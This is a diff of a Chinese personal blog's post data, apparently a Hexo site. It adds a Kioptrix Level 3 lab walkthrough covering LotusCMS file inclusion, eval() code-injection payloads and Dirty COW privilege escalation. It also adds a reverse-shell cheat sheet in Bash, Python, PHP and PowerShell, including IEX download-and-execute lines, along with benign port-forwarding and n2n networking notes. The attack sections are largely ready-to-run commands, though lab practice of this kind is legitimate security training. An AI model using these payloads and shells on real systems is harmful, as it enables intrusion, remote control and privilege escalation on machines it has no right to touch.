@@ -3640,6 +3640,8 @@
 <p>#<strong>解决方案</strong></p>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">##windows</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">8080</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">8080</span></span><br><span class="line">---</span><br><span class="line">#如果更多的端口映射</span><br><span class="line"><span class="comment">rem 映射Web服务 (HTTP)</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">80</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">80</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射HTTPS服务</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">443</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">443</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射远程桌面 (RDP)</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">3389</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">3389</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射SSH服务</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">22</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">22</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射你之前设置的8080端口</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">8080</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">8080</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射SMB文件共享</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">445</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">445</span></span><br><span class="line"></span><br><span class="line">##linux</span><br><span class="line">#启用IP转发（临时）</span><br><span class="line">sudo sysctl -w <span class="built_in">net</span>.ipv4.ip_forward=<span class="number">1</span></span><br><span class="line">#永久</span><br><span class="line">sudo nano /etc/sysctl.conf</span><br><span class="line">#更新</span><br><span class="line">sudo sysctl -p</span><br><span class="line"># 将目标为热点IP:<span class="number">8080</span>的包，转发到内网服务器</span><br><span class="line">sudo iptables -t nat -A PREROUTING -p tcp -i wlan1 --dport <span class="number">8080</span> -j DNAT --to-destination <span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span>:<span class="number">8080</span></span><br></pre></td></tr></table></figure>
 
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#查看转发的表-windows</span><br><span class="line">netsh interface portproxy show all</span><br><span class="line">#删除对应的表</span><br><span class="line">netsh interface portproxy delete v4tov4 listenaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">123</span> listenport=<span class="number">8080</span></span><br><span class="line">#清除转发表</span><br><span class="line">netsh interface portproxy reset</span><br><span class="line">#增加对应的转发</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">123</span> listenport=<span class="number">8080</span> connectaddress=<span class="number">172</span>.<span class="number">16</span>.<span class="number">5</span>.<span class="number">2</span> connectport=<span class="number">8080</span></span><br></pre></td></tr></table></figure>
+
 <p>当然直接用<strong>Ngrok &#x2F; FRP (Fast Reverse Proxy) &#x2F; ew</strong>等穿透工具都可以</p>
 <p>无互联网开热点的解决方案如下：</p>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">##windows</span><br><span class="line">netsh wlan <span class="built_in">set</span> hostednetwork <span class="built_in">mode</span>=allow ssid=MyHotspot key=MyPassword123</span><br><span class="line">#开启</span><br><span class="line">netsh wlan <span class="built_in">start</span> hostednetwork</span><br><span class="line">#关闭</span><br><span class="line">netsh wlan stop hostednetwork</span><br><span class="line">#查看</span><br><span class="line">netsh wlan show hostednetwork</span><br><span class="line">#删除</span><br><span class="line">netsh wlan <span class="built_in">set</span> hostednetwork <span class="built_in">mode</span>=disallow</span><br><span class="line">#检查是否可以</span><br><span class="line">netsh wlan show drivers</span><br></pre></td></tr></table></figure>
@@ -3727,8 +3729,83 @@
 <h3 id="Kioptrix-Level-3"><a href="#Kioptrix-Level-3" class="headerlink" title="Kioptrix Level 3"></a>Kioptrix Level 3</h3><p>注意：需要将下面的放到你的hosts文件内</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;ip&gt; kioptrix3.com	#靶场</span><br><span class="line"></span><br><span class="line">#C:\Windows\System32\drivers\etc\hosts</span><br><span class="line">#/etc/hosts</span><br></pre></td></tr></table></figure>
 
-<h5 id="信息搜集-2"><a href="#信息搜集-2" class="headerlink" title="信息搜集"></a>信息搜集</h5><p>测试：<br>如果参数名是 <code>?system=</code>、<code>?page=</code>、<code>?file=</code> 或 <code>?view=</code>，很可能是文件包含；后端开发者通常使用这个参数来决定加载哪个模块（比如 <code>Admin.php</code>、<code>Login.php</code>）</p>
+<h5 id="信息搜集-2"><a href="#信息搜集-2" class="headerlink" title="信息搜集"></a>信息搜集</h5><p>测试：</p>
+<p>​	可以在网上搜<code>LotusCMS</code>的源码或者直接搜它的历史漏洞之类的，但是今天搜历史漏洞可以把它老底都暴光，搜源码，然后看对应接口长什么样子的，保证一定的公平性。</p>
+<p>index.php的源码如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;install.php&quot;</span>))&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: install.php&quot;</span>);	</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;core/lib/router.php&quot;</span>);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Router</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h5><h6 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h6><img src="../image/oscp-image-log/easy/Kioptrix_Level_3/源码-1.png" alt="php" style="zoom:60%;" />
+
+<p>​	如上图就加载了两个功能，第一个功能是安装，那主要功能肯定在<code>router.php</code>了，如下：<br><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-1.png" alt="php"></p>
+<p>​	可以得出一个通用的结论如果参数名是 <code>?system=</code>、<code>?page=</code>、<code>?file=</code> 或 <code>?view=</code>，很可能是文件包含；后端开发者通常使用这个参数来决定加载哪个模块（比如 <code>Admin.php</code>、<code>Login.php</code>），当然这是16年前的代码了，放在现在肯定行不通了。</p>
+<p>​	如下证明<code>php</code>是<code>5.2.4</code></p>
 <p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/php%E7%89%88%E6%9C%AC%E7%89%B9%E6%80%A7.png" alt="php"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: http://&lt;ip:port&gt;/index.php?system=../../../../../../etc/passwd%001</span><br></pre></td></tr></table></figure>
+
+<p>​	目前很少看到 “<code>url</code>即<code>api</code>“ 了，大多都是网页 “<code>Hash</code>路由+其他域名<code>api</code>“ 的实现</p>
+<table>
+<thead>
+<tr>
+<th><strong>截断方式</strong></th>
+<th><strong>依赖环境</strong></th>
+<th><strong>现代防御状态</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Null Byte (%00)</strong></td>
+<td>PHP &lt; 5.3.4</td>
+<td><strong>已失效</strong> (PHP 核心已加固)</td>
+</tr>
+<tr>
+<td><strong>Path Length</strong></td>
+<td>操作系统底层限制</td>
+<td><strong>极难实现</strong> (现代 PHP 会预校验)</td>
+</tr>
+<tr>
+<td><strong>RFI Query (?)</strong></td>
+<td>开启 URL 包含</td>
+<td><strong>已禁用</strong> (默认关闭 allow_url_include)</td>
+</tr>
+<tr>
+<td><strong>点号&#x2F;空格</strong></td>
+<td>旧版 Windows</td>
+<td><strong>已失效</strong></td>
+</tr>
+</tbody></table>
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/%E8%B6%85%E7%AE%A1%E5%AF%86%E7%A0%81-1.png" alt="php"></p>
+<h6 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h6><p>代码还是那一串(危险函数<code>eval()</code>)：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">public function Router()&#123;</span><br><span class="line">	//Get page request (<span class="keyword">if</span> any)</span><br><span class="line">	$page = $this-&gt;getInputString(&quot;page&quot;, &quot;index&quot;);</span><br><span class="line">	</span><br><span class="line">	//Get plugin request (<span class="keyword">if</span> any)</span><br><span class="line">	$plugin = $this-&gt;getInputString(&quot;system&quot;, &quot;Page&quot;);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(file_exists(&quot;core/plugs/&quot;.$plugin.&quot;Starter.php&quot;))&#123;</span><br><span class="line">		//Include Page fetcher</span><br><span class="line">		include(&quot;core/plugs/&quot;.$plugin.&quot;Starter.php&quot;);</span><br><span class="line"></span><br><span class="line">		//Fetch the page and get over loading cache etc...</span><br><span class="line">		eval(&quot;new &quot;.$plugin.&quot;Starter(&#x27;&quot;.$page.&quot;&#x27;);&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>原本拼接是：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?system=Admin</span><br><span class="line">拼接：</span><br><span class="line">eval(new AdminStarter(&#x27;index&#x27;);)</span><br><span class="line">注意，page是没有的话是默认的index</span><br></pre></td></tr></table></figure>
+
+<p>正常执行的<code>php</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>
+
+<p>所以</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload:	/index.php?system=Page&amp;page=index&#x27;);phpinfo();/*</span></span><br><span class="line"><span class="comment">#拼接后的代码：</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;new PageStarter(&#x27;index&#x27;);phpinfo();/*&#x27;);&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#或者			/index.php?system=Page&amp;page=&#x27;.phpinfo().&#x27;</span></span><br><span class="line"><span class="comment">#更加优雅  &#x27;. phpinfo() .&#x27;  取代了   &quot;.$page.&quot; 完成一次解析然后会返回一个布尔值 true  真是优雅啊~！！</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;new PageStarter(&#x27;&#x27;.phpinfo().&#x27;&#x27;);&quot;</span>);</span><br><span class="line"><span class="comment">#想要传参就要解析.phpinfo().</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-1.png" alt="RCE"></p>
+<h5 id="测试靶场"><a href="#测试靶场" class="headerlink" title="测试靶场"></a>测试靶场</h5><p>之后同理，反弹<code>shell</code>后提权，(好像<code>bash -i</code>用不了，<code>&gt;</code>用不了，<code>cd</code>用不了等等的，但是还好<code>wget</code>能用)</p>
+<p>利用文件包含执行代码：<br><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-2.png" alt="RCE"></p>
+<p>然后就遇到了一堆<code>exp</code>用不了的情况了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#寻找系统中配置错误且带有特殊权限的可执行文件。</span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 第一步：调用 Python 启动 PTY</span></span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># kali键盘全转发</span></span><br><span class="line">ctrl+z</span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#找到当前目录下所有的root关键字</span></span><br><span class="line">grep -rnw <span class="string">&quot;.&quot;</span> -e <span class="string">&quot;password&quot;</span></span><br><span class="line">grep -C 5 <span class="string">&quot;password&quot;</span> gconfig.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/grep%E6%93%8D%E4%BD%9C-1.png" alt="RCE"></p>
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/grep%E6%93%8D%E4%BD%9C-2.png" alt="RCE"></p>
+<p>然后可以在<code>root</code>账户的数据库里找到其他两个账号，然后尝试用<code>ht</code>编辑器直接更改<code>/etc/passwd</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 第1步：设置变量</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第2步：现在运行 ht 应该就能看到蓝色界面了</span></span><br><span class="line">/usr/local/bin/ht</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/%E7%BC%96%E8%BE%91%E5%99%A8ht.png" alt="RCE"></p>
+<p>或者直接使用<a href="https://www.exploit-db.com/exploits/40839">脏牛内核提权</a></p>
+<p>原理是条件竞争，使得数据直接写入了受保护的只读文件<code>/etc/passwd</code>，所以要稍微等一下，然后控制台需要正常一点</p>
+<p>注意：使用了脏牛<code>root</code>就会被覆盖了</p>
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/%E8%84%8F%E7%89%9B%E6%BC%8F%E6%B4%9E-1.png" alt="RCE"></p>
+<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.cnblogs.com/masses0x1/p/15780876.html">vulnhub KioptrixVM3 靶场练习&amp;LotusCMS漏洞分析 - rpsate - 博客园</a></p>
+<p><a href="https://www.freebuf.com/news/170656.html">CTF实战 | Kioptrix（#3）靶机渗透测试 - FreeBuf网络安全行业门户</a></p>
+<p><a href="https://blog.csdn.net/m0_73812072/article/details/155023122">渗透测试——Kioptrix3靶机多种方法渗透提权（脏牛漏洞提权，手把手详细教程）-CSDN博客</a></p>
 ]]></content>
       <categories>
         <category>Cybersecurity</category>
@@ -5033,10 +5110,52 @@
 <td>仅在安全校验通过后，将纯文本 URL 转换为 <code>&lt;a&gt;</code> 标签，确保输出的 DOM 结构可控。</td>
 </tr>
 </tbody></table>
-<h1 id="PHP-Reverse-Shell"><a href="#PHP-Reverse-Shell" class="headerlink" title="PHP Reverse Shell"></a>PHP Reverse Shell</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sock</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;10.0.0.1&quot;</span>,<span class="number">8080</span>);</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹<code>shell</code></h1><table>
+<thead>
+<tr>
+<th><strong>方式</strong></th>
+<th><strong>依赖工具</strong></th>
+<th><strong>优点</strong></th>
+<th><strong>缺点</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Bash</strong></td>
+<td>Bash Shell</td>
+<td>无需安装，极其通用</td>
+<td>某些精简系统（如 Alpine）可能不支持</td>
+</tr>
+<tr>
+<td><strong>NC (FIFO)</strong></td>
+<td>netcat</td>
+<td>几乎所有系统都有 nc</td>
+<td>命令较长，容易出错</td>
+</tr>
+<tr>
+<td><strong>Python</strong></td>
+<td>Python 2&#x2F;3</td>
+<td>交互性强，稳定</td>
+<td>需要预装 Python 环境</td>
+</tr>
+<tr>
+<td><strong>PHP</strong></td>
+<td>PHP-cli</td>
+<td>Web 服务器常用</td>
+<td>需要 PHP 命令行模式支持</td>
+</tr>
+</tbody></table>
+<h2 id="PHP-Reverse-Shell"><a href="#PHP-Reverse-Shell" class="headerlink" title="PHP Reverse Shell"></a>PHP Reverse Shell</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span> (<span class="number">0</span>);</span><br><span class="line"><span class="variable">$ip</span>=<span class="string">&quot;192.168.1.1&quot;</span>;</span><br><span class="line"><span class="variable">$port</span>=<span class="number">8080</span>;</span><br><span class="line"><span class="variable">$sock</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="variable">$ip</span>,<span class="variable">$port</span>);</span><br><span class="line"><span class="variable">$proc</span>=<span class="title function_ invoke__">proc_open</span>(<span class="string">&quot;/bin/sh -i&quot;</span>, <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="variable">$sock</span>, <span class="number">1</span>=&gt;<span class="variable">$sock</span>, <span class="number">2</span>=&gt;<span class="variable">$sock</span>),<span class="variable">$pipes</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h1 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#centos--反弹shell</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"><span class="comment">#宿主</span></span><br><span class="line">nc -lvnp <span class="number">8080</span></span><br><span class="line"><span class="comment">#python</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.1.1&quot;,监听端口);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
 
+<h2 id="RCE-Reverse-Shell"><a href="#RCE-Reverse-Shell" class="headerlink" title="RCE Reverse Shell"></a>RCE Reverse Shell</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#centos--反弹shell</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"><span class="comment">#宿主</span></span><br><span class="line">nc -lvnp <span class="number">8080</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Python-Reverse-Shell"><a href="#Python-Reverse-Shell" class="headerlink" title="Python Reverse Shell"></a>Python Reverse Shell</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>&quot;,监听端口));os.dup2(s.fileno(),<span class="number">0</span>);os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line"></span><br><span class="line">#python</span><br><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;<span class="number">10</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>&quot;,<span class="number">8080</span>));os.dup2(s.fileno(),<span class="number">0</span>);os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);subprocess.<span class="keyword">call</span>([&quot;/bin/sh&quot;,&quot;-i&quot;])&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Windows-Reverse-Shell"><a href="#Windows-Reverse-Shell" class="headerlink" title="Windows Reverse Shell"></a>Windows Reverse Shell</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#powercat反弹</span></span><br><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.204.144:1234/Invoke-PowerShellTcp.ps1&#x27;</span>);<span class="built_in">Invoke-PowerShellTcp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.<span class="number">204.144</span> <span class="literal">-port</span> <span class="number">4444</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Reverse UDP shell</span></span><br><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.204.144:1234/Invoke-PowerShellUdp.ps1&#x27;</span>);<span class="built_in">Invoke-PowerShellUdp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.<span class="number">204.144</span> <span class="literal">-port</span> <span class="number">6666</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Reverse ICMP shell</span></span><br><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.204.144:1234/Invoke-PowerShellIcmp.ps1&#x27;</span>);<span class="built_in">Invoke-PowerShellIcmp</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.<span class="number">204.144</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://github.com/besimorhino/powercat">工具</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/2485156">Windows环境下反弹shell各类姿势-腾讯云开发者社区-腾讯云</a></p>
 ]]></content>
       <categories>
         <category>Cybersecurity</category>
@@ -6043,12 +6162,10 @@
   <entry>
     <title>n2n实操内网通信</title>
     <url>/2025/09/04/n2n%E5%AE%9E%E6%93%8D%E5%86%85%E7%BD%91%E9%80%9A%E4%BF%A1/</url>
-    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p>​	本着垃圾佬的原则，准备将家里吃灰的树莓派利用起来，所以准备openmediavault+n2n+frr实现任意地点访问屋里内网设备，但是frr老是学习不到内网设备，所以直接用iptables端口映射实现了</p>
-<p>​	主要记录n2n以及iptables映射，优点是少量的内网设备无需使用复杂的frr，缺点是无法支持动态的ip映射以及过多的内网设备映射管理程度直线上升</p>
+    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p>​	本着垃圾佬的原则，准备将家里吃灰的树莓派利用起来，所以准备openmediavault+n2n+frr实现任意地点访问屋里内网设备，但是frr老是学习不到内网设备，所以直接用iptables端口映射实现了。</p>
+<p>​	主要记录n2n以及iptables映射，优点是少量的内网设备无需使用复杂的frr，缺点是无法支持动态的ip映射以及过多的内网设备映射管理程度直线上升，主要是记录搭建的流程，n2n很久远的项目了，快速组网的话建议用<code>easytier</code>或者<code>zeroTier</code>。</p>
 <p>参考网址：</p>
-<p><a href="https://xyzbz.cn/archives/944/">树莓派4b安装OpenMediaVault</a></p>
-<p><a href="https://cloud.tencent.com/developer/article/1760345?policyId=1003">通过N2N组网并运行OSPF动态路由</a></p>
-<p><a href="https://github.com/ntop/n2n">n2n开源地址</a></p>
+<p><a href="https://xyzbz.cn/archives/944/">树莓派4b安装OpenMediaVault</a>、<a href="https://cloud.tencent.com/developer/article/1760345?policyId=1003">通过N2N组网并运行OSPF动态路由</a>、<a href="https://github.com/ntop/n2n">n2n开源地址</a></p>
 <p><a href="https://github.com/happynclient/happynwindows">n2n-windows软件</a></p>
 <p>注：OpenMediaVault安装docker的话需要注意自身网络考虑是否要换源</p>
 <p><a href="https://www.bilibili.com/opus/1008600304150642709">OMV7.0部署及docker安装 - 哔哩哔哩</a></p>
@@ -6075,7 +6192,6 @@
 
 <p>windows可以使用<a href="https://github.com/happynclient/happynwindows">n2n-windows软件</a>进行连接：<br><img src="/../image/n2n-iptables/1.png"></p>
 <p>! 该方法可以使得所有输入同一服务ID和服务密钥的用户在同一局域网中<br>服务ID和服务密钥就是之前输入的账号和密码</p>
-<h1 id="2-建议"><a href="#2-建议" class="headerlink" title="2-建议"></a>2-建议</h1><p>n2n太老了，建议用easytier或者zeroTier，这两个组网后连接快的多</p>
 ]]></content>
       <categories>
         <category>p2p</category>
